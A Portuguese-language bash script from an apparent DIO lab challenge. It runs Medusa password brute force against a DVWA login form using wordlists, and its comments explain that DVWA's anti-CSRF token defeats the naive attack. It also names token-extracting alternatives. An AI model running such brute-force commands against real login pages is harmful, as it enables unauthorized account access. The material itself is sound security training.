#!/usr/bin/env bash
# ============================================================
#  Bônus B — Formulário web (DVWA) com Medusa (Kali Linux)
#  Desafio DIO: força bruta SMB com Medusa
#
#  Uso:  ./05-bonus-dvwa.sh <IP_DO_ALVO>
#  Ex.:  ./05-bonus-dvwa.sh 192.168.56.20
#
#  Pré-requisitos no DVWA:
#    - login padrão: admin / password
#    - DVWA Security: Low (menu "DVWA Security")
#
#  ⚠️  Somente em laboratório com autorização!
# ============================================================

TARGET="${1:?Uso: $0 <IP_do_alvo>}"

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
USERS="$ROOT/wordlists/users.txt"
PASS="$ROOT/wordlists/passwords.txt"
OUT="$ROOT/results"
mkdir -p "$OUT"

echo "[*] Alvo: $TARGET — DVWA em http://$TARGET/dvwa/login.php"
echo
echo "[!] ATENÇÃO: versões atuais do DVWA usam um token anti-CSRF (user_token)"
echo "    no formulário de login. Sem o token, TODA tentativa é rejeitada e o"
echo "    Medusa (que não resolve o token sozinho) falha mesmo com senha correta."
echo "    Este script serve para DEMONSTRAR a tentativa e a limitação."
echo "    Alternativas: Burp Intruder (Pitchfork com extração do token) ou"
echo "    script próprio em Python (requests + regex do user_token)."

echo
echo "[*] Rodando módulo http do Medusa contra o formulário clássico..."
medusa -h "$TARGET" \
       -U "$USERS" -P "$PASS" \
       -M http \
       -m PAGE:'/dvwa/login.php' \
       -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
       -m DENY-SIGNAL:'Login failed' \
       -t 4 -v 4 \
       -o "$OUT/medusa-dvwa.txt"

echo
echo "[+] Log em results/medusa-dvwa.txt"
echo "[+] Reflexão para o README: o token anti-CSRF é a MITIGAÇÃO funcionando —"
echo "    o brute force 'ingênuo' de formulário morre, e o atacante precisa adaptar."
